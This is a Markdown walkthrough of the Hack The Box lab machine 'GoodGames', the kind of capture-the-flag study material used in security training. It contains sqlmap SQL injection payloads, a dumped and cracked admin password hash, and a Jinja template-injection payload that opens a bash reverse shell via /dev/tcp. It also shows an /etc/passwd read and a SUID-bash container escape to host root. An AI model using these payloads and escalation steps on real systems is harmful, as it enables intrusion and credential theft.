---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - SQLI
  - SQLMap
  - SSTI
---
# Overview

| Name        | GoodGames |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV 10.129.85.174 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-17 01:26 CDT
Nmap scan report for 10.129.85.174
Host is up (0.077s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-title: GoodGames | Community and Store
Service Info: Host: goodgames.htb
```

![[goodgames.png]]

We register and login but can't find any functionality. Let's test SQLi in login page.
# Initial Foothold
## SQLMap

First save the POST request of login.

```
POST /login HTTP/1.1
Host: goodgames.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://goodgames.htb/
Content-Type: application/x-www-form-urlencoded
Origin: http://goodgames.htb
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
Content-Length: 35

email=test%40gmail.com&password=test1234

```

```bash
$ sqlmap -r req.txt --batch --level 3 --risk 3
<SNIP>
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 450 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: email=test@gmail.com' AND 9122=(SELECT (CASE WHEN (9122=9122) THEN 9122 ELSE (SELECT 6598 UNION SELECT 1309) END))-- KHie&password=test1234

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@gmail.com' AND (SELECT 4216 FROM (SELECT(SLEEP(5)))MjQU)-- rTcf&password=test1234
---
[01:35:17] [INFO] the back-end DBMS is MySQL
```

```bash
$ sqlmap -r req.txt --batch --dbs

[01:37:04] [INFO] retrieved: 2
[01:37:06] [INFO] retrieved: information_schema
[01:37:17] [INFO] retrieved: main
available databases [2]:
[*] information_schema
[*] main
```

Get Tables from Main Database

```bash
$ sqlmap -r req.txt --batch -D main --tables
[01:37:58] [INFO] retrieved: 3
[01:38:00] [INFO] retrieved: blog
[01:38:02] [INFO] retrieved: blog_comments
[01:38:08] [INFO] retrieved: user
Database: main
[3 tables]
+---------------+
| user          |
| blog          |
| blog_comments |
+---------------+
```

Dump `user`:

```bash
$ sqlmap -r req.txt --batch -D main -T user --dump
<SNIP>
Database: main                                                                                                                       
Table: user
[2 entries]
+----+---------------------+--------+-----------------------------------------+
| id | email               | name   | password                                |
+----+---------------------+--------+-----------------------------------------+
| 1  | admin@goodgames.htb | admin  | 2b22337f218b2d82dfc3b6f77e7cb8ec        |
| 2  | test@test.com       | test   | 098f6bcd4621d373cade4e832627b4f6 (test) |
+----+---------------------+--------+-----------------------------------------+
```

Crack admin hash `2b22337f218b2d82dfc3b6f77e7cb8ec` from crackstation and we get password `superadministrator`. Now login with these creds in site `admin@goodgames.htb:superadministrator`.

![[goodgames2.png]]

We find new settings icon and new subdomain `internal-administration.goodgames.htb`:

![[goodgames3.png]]

Login with previous creds `admin:superadministrator`:

![[goodgames4.png]]

Save Full Name as `{{7*7}}`:

![[goodgames5.png]]

It returns `49` which confirms SSTI.
## SSTI

Save your Full Name as this payload:

```python
{{namespace.__init__.__globals__.os.popen("bash -c 'bash -i >& /dev/tcp/10.10.14.122/4444 0>&1'").read() }}
```

Save it and we immediately get the shell.

```bash
$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.85.174] 34644
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# 
```

```bash
root@3a453ab39d3d:/backend# cd /home
cd /home
root@3a453ab39d3d:/home# ls
ls
augustus
root@3a453ab39d3d:/home# cd augustus
cd augustus
root@3a453ab39d3d:/home/augustus# ls
ls
user.txt
root@3a453ab39d3d:/home/augustus# cat user.txt
cat user.txt
e74aa2294462e1551ca65effb3169656
```
# Privilege Escalation

```bash
root@3a453ab39d3d:/# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
root@3a453ab39d3d:/# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)
        RX packets 1307  bytes 200185 (195.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1120  bytes 2288268 (2.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`/etc/passwd` doesn't show `augustus` there which may mean that we are not in main host. `ifconfig` shows that our IP is `172.19.0.2`. We need to find main host. So we are likely in docker container.

```bash
root@3a453ab39d3d:/# ping 172.17.0.1
ping 172.17.0.1
PING 172.17.0.1 (172.17.0.1) 56(84) bytes of data.
64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.075 ms
64 bytes from 172.17.0.1: icmp_seq=2 ttl=64 time=0.059 ms
64 bytes from 172.17.0.1: icmp_seq=3 ttl=64 time=0.056 ms
64 bytes from 172.17.0.1: icmp_seq=4 ttl=64 time=0.058 ms
64 bytes from 172.17.0.1: icmp_seq=5 ttl=64 time=0.060 ms
64 bytes from 172.17.0.1: icmp_seq=6 ttl=64 time=0.049 ms
```

We can ping `172.17.0.1` which is likely main host. Now scan its port.

```bash
root@3a453ab39d3d:/backend# export ip=172.19.0.1; for port in $(seq 1 1000); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
<v/null || echo Connection Timeout > /dev/null; done
The port 22 is open
The port 80 is open
```

SSH in open in main host.

```bash
root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1
ssh augustus@172.19.0.1
Pseudo-terminal will not be allocated because stdin is not a terminal.
Host key verification failed.
root@3a453ab39d3d:/backend# 
```

First upgrade the shell.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Use password `superadministrator`:

```bash
root@3a453ab39d3d:/backend# python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1

ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: superadministrator

Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ whoami
whoami
augustus
```

`sudo -l` doesn't work and nothing interesting can be found.

```bash
augustus@GoodGames:/home$ cd augustus
cd augustus
augustus@GoodGames:~$ ls -la
ls -la
total 24
drwxr-xr-x 2 augustus augustus 4096 Dec  2  2021 .
drwxr-xr-x 3 root     root     4096 Oct 19  2021 ..
lrwxrwxrwx 1 root     root        9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus  220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus 3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 augustus augustus  807 Oct 19  2021 .profile
-rw-r----- 1 root     augustus   33 Oct 17 07:25 user.txt
```

Here `user.txt` have root permission.

Open another session where you are in `172.19.0.2` and make a `test.txt` file in `augustus` home directory:

```bash
$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.85.174] 39010
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# cd /home/augustus
cd /home/augustus
root@3a453ab39d3d:/home/augustus# echo "test" > test.txt
echo "test" > test.txt
```

Now in that SSH see:

```bash
augustus@GoodGames:~$ ls -la
ls -la
total 28
drwxr-xr-x 2 augustus augustus 4096 Oct 17 08:03 .
drwxr-xr-x 3 root     root     4096 Oct 19  2021 ..
lrwxrwxrwx 1 root     root        9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus  220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus 3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 augustus augustus  807 Oct 19  2021 .profile
-rw-r--r-- 1 root     root        5 Oct 17 08:03 test.txt
-rw-r----- 1 root     augustus   33 Oct 17 07:25 user.txt
```

We can see that it is owned by root there. Since we have a root shell within the container, we can copy `/bin/bash` to `/home/augustus` and set the SUID bit. This should allow us to SSH back in and run bash as root:

First from SSH session:

```bash
augustus@GoodGames:~$ cp /bin/bash .
cp /bin/bash .
```

Now in container:

```bash
root@3a453ab39d3d:/home/augustus# # Take ownership of the file
chown root:root bash
# Take ownership of the file
root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# # Set the SUID bit
chmod 4777 bash
# Set the SUID bit
root@3a453ab39d3d:/home/augustus# chmod 4777 bash
```

Now in SSH session:

```bash
augustus@GoodGames:~$ ls -la
ls -la
total 1236
drwxr-xr-x 2 augustus augustus    4096 Oct 17 08:06 .
drwxr-xr-x 3 root     root        4096 Oct 19  2021 ..
-rwsrwxrwx 1 root     root     1234376 Oct 17 08:06 bash
lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile
-rw-r--r-- 1 root     root           5 Oct 17 08:03 test.txt
-rw-r----- 1 root     augustus      33 Oct 17 07:25 user.txt
augustus@GoodGames:~$ ./bash -p
./bash -p
bash-5.1# whoami
whoami
root
bash-5.1# cat /root/root.txt
cat /root/root.txt
dbd44c2bfa29acf37728314697f5ec32
```

---


